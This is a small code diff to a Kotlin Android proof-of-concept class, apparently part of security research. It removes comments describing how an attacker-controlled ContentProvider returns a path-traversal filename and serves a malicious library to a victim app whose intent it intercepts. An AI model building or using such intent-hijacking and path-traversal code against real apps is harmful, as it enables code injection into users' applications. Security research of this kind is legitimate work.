@@ -10,10 +10,6 @@ class EvilContentActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Return a content:// URI that resolves to our malicious ContentProvider.
-        // When the victim app:
-        //   1. Queries this URI → EvilContentProvider.query() returns path-traversal filename
-        //   2. Opens this URI → EvilContentProvider.openFile() serves malicious content
         val maliciousUri = Uri.parse("content://com.attacker.evil/malicious_lib")
 
         Log.w("ATTACKER", "Intercepted REQUEST_LIBRARY intent!")
